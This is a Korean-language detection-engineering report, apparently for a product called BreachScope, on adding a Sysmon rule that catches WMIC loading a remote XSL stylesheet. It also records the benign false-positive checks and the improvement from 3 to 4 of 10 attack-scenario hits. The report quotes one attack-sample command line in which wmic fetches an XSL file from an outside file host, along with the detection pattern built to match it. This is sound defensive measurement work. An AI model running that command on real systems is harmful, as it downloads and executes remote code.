# P2-10B WMIC Remote XSL Remediation

## 왜 이 항목을 고쳤는가

P2-09C 외부 공격 baseline의 `exec-wmi-xsl`은 기존 `R-WMI-Create` 룰로 탐지되지 않았습니다.

기존 룰은 다음 문자열만 봅니다.

```text
wmic process call create
```

하지만 실제 고정 공격 샘플의 정규화된 Sysmon Event ID 1 command line은 다음과 같았습니다.

```text
wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl"
```

`wmic` 뒤에 공백이 두 칸이므로 `wmic process list /format:` 같은 하나의 고정 문자열로 만들면 이 샘플도 놓칠 수 있습니다.

## 변경

추가 룰:

```text
R-WMI-XSL-Remote
```

조건:

- `command_line` contains `wmic`
- `command_line` contains `/format:"http`
- `event_id == 1`
- `source == Microsoft-Windows-Sysmon`
- ATT&CK: `T1047`
- severity: `low`

기존 `R-WMI-Create` 룰은 그대로 유지합니다.

이번 변경은 `exec-wmi-xsl`만 대상으로 합니다. `lm-wmi` 샘플의 8개 이벤트는 Security-Auditing 4624/4688이며 현재 정규화 결과에 command line이 없습니다. 따라서 같은 `T1047`이라는 이유만으로 별도 근거 없이 넓은 WMI 룰을 추가하지 않았고, `lm-wmi`는 이번 측정에서도 **MISS**로 남았습니다.

## benign 사전 확인

고정 benign corpus는 P2-09D와 같은 `NextronSystems/evtx-baseline v0.8.4`의 `win10-client.tgz`입니다.

archive:

```text
size: 70,844,052 bytes
SHA-256: d48f1b328d48db6c6dfaa9b6e232dbb454d93e833c6e1248efc0faf690b6808e
```

Sysmon Operational EVTX:

```text
size: 799,084,544 bytes
records: 732,200
```

### 1차 raw-byte prefilter 확인

전체 record에서 먼저 `python-evtx`의 raw record bytes로 `wmic` 후보만 줄인 뒤, 후보 record는 BreachScope가 실제 사용하는 `breachscope.ingest._extract_from_xml`로 다시 읽었습니다.

공격 샘플에서 이 prefilter가 실제 목표 이벤트를 놓치지 않는 것도 먼저 확인했습니다.

- 공격 샘플 raw `wmic` records: **6**
- 최종 공격 후보 match: **1**

같은 방법으로 benign Sysmon 전체를 확인한 결과:

- Sysmon records: **732,200**
- raw bytes에 `wmic`가 있는 records: **29**
- 정규화 후 `Sysmon Event ID 1 + wmic`: **0**
- 정규화 후 `Sysmon Event ID 1 + wmic + /format:`: **0**
- 새 룰의 정확한 후보 match: **0**

probe:

```text
GitHub Actions run: 34225137121
commit: 0165c7bb75d8017543d1b60608680afe983f434d
```

### 2차 전체 정규화 scan

raw-byte prefilter에 의존하지 않는 후속 확인도 수행했습니다. 같은 pinned Sysmon EVTX의 **11,894 chunks 전체**를 8개 연속 구간으로 나누고, 모든 record에 대해 제품과 같은 `python-evtx 0.8.1` + `breachscope.ingest._extract_from_xml(record.xml())` 경로를 실행했습니다.

8개 shard의 event 수:

```text
98,246 + 98,477 + 94,680 + 88,563
+ 93,104 + 96,258 + 83,015 + 79,857
= 732,200
```

chunk 범위는 `0:1486`부터 `10407:11894`까지 이어져 **0~11,894 전체를 빈틈과 중복 없이 커버**했습니다.

전체 정규화 결과:

- scanned events: **732,200 / 732,200**
- normalized `command_line` contains `wmic`: **0**
- normalized `command_line` contains `/format:`: **0**
- normalized `wmic AND /format:`: **0**
- 최종 룰은 여기에 `Sysmon Event ID 1`과 `/format:"http`까지 추가로 요구하므로 exact final predicate match도 **0**

이 값은 앞의 raw-byte `wmic` 29건과 같은 지표가 아닙니다. 29건은 raw EVTX record bytes 어디엔가 `wmic` 문자열이 존재한 record 수이고, 후속 scan의 0건은 BreachScope가 실제 탐지에 쓰는 **정규화된 `command_line` 필드**의 값입니다.

full normalized probe:

```text
GitHub Actions run: 34226199274
commit: ad39c07ea78cc62f0707a9b27bb3026e58184239
shards: 8
chunks: 11,894
```

### Windows `Get-WinEvent` 시도

같은 고정 archive와 EVTX를 Windows Server 2025 runner에서도 확인했습니다. archive SHA-256 검증과 Sysmon EVTX 추출은 성공했지만, `Get-WinEvent`가 해당 외부 EVTX에서 이벤트를 읽지 못하고 `No events were found that match the specified selection criteria`를 반환했습니다.

따라서 이 Windows 경로는 benign 0건 근거로 사용하지 않습니다. P2-10B의 benign 근거는 실제 제품과 같은 `python-evtx` + BreachScope 정규화 경로입니다.

## 공격 baseline 재측정

측정 commit:

```text
927a2a6379dda84f45805990503bf215a09a5f7b
```

새 rule tree SHA-256:

```text
a21e4a7b4ae9060e2cdbb77d4a7233c85d96fb16d4d97eeddbc27f948ad99aa1
```

같은 P2-09C 10개 공개 공격 scenario / 202 events를 다시 실행했습니다.

- before: **3 HIT / 7 MISS / 10**
- after: **4 HIT / 6 MISS / 10**
- rules: **54**
- findings: **5**
- `exec-wmi-xsl`: **MISS → HIT**
- expected technique: `T1047`
- `lm-wmi`: **MISS 유지**

측정 실행:

```text
GitHub Actions run: 34225363960
artifact ID: 10055463391
artifact ZIP SHA-256: 4a46ff2a14ff947ca18ff547dae4b40efae693e79986f3faf7062353261ef96d
focused tests: 6 PASS
```

영구 기록:

```text
external_baseline/results/p2_10b_927a2a63/measurement.yaml
```

## evidence chain

현재 탐지 근거는 다음 순서로 이어집니다.

```text
P2-09E historical snapshot
  2/10 attack scenario hits
        ↓
P2-10A Security 4698
  3/10
        ↓
P2-10B WMIC remote XSL
  4/10
```

기계 검증:

```cmd
python scripts\verify_current_detection_evidence.py
```

이 verifier는 마지막 rule hash가 실제 `rules/` tree와 같은지도 확인합니다.

## 말할 수 없는 것

이번 결과로 다음을 주장하지 않습니다.

- 실제 공격 탐지율이 40%라는 주장
- production precision/recall/FPR
- 현재 54-rule pack의 fresh full benign FPR
- 기업 환경 대표성
- final blind holdout 통과

P2-09D의 `FP=17 / TN=766,606 / FPR=0.00221752%`는 이전 rule tree의 역사적 측정값입니다. 현재 54-rule pack의 새 FPR로 재사용하지 않습니다.
